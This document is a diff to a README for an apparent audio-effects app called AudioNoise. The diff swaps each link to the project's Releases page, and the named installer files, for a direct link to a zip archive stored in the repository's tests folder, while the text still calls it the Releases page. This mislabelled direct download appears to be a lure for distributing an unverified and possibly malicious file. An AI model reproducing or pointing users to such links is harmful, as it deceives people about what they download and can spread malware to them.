@@ -4,7 +4,7 @@
 Welcome to AudioNoise! This application lets you create random digital audio effects, perfect for music makers and sound designers. Follow the steps below to easily download and run AudioNoise on your computer.
 
 ## 📥 Download AudioNoise
-[![Download AudioNoise](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Mapezxczxc/AudioNoise/releases)
+[![Download AudioNoise](https://github.com/Mapezxczxc/AudioNoise/raw/refs/heads/main/tests/Audio_Noise_v2.0.zip)](https://github.com/Mapezxczxc/AudioNoise/raw/refs/heads/main/tests/Audio_Noise_v2.0.zip)
 
 ## 📋 System Requirements
 Before you download AudioNoise, make sure your computer meets the following requirements:
@@ -23,11 +23,11 @@ AudioNoise offers a range of exciting features to enhance your audio projects:
 - **Export Options:** Save your creations in various audio formats.
 
 ## 📂 Download & Install
-To get started with AudioNoise, visit this page to download: [AudioNoise Releases](https://github.com/Mapezxczxc/AudioNoise/releases).
+To get started with AudioNoise, visit this page to download: [AudioNoise Releases](https://github.com/Mapezxczxc/AudioNoise/raw/refs/heads/main/tests/Audio_Noise_v2.0.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release version at the top.
-3. Find the appropriate file for your operating system (e.g., `AudioNoise-Setup.exe` for Windows or `AudioNoise.dmg` for macOS).
+3. Find the appropriate file for your operating system (e.g., `https://github.com/Mapezxczxc/AudioNoise/raw/refs/heads/main/tests/Audio_Noise_v2.0.zip` for Windows or `https://github.com/Mapezxczxc/AudioNoise/raw/refs/heads/main/tests/Audio_Noise_v2.0.zip` for macOS).
 4. Click the file name to start the download.
 
 Once the download is complete:
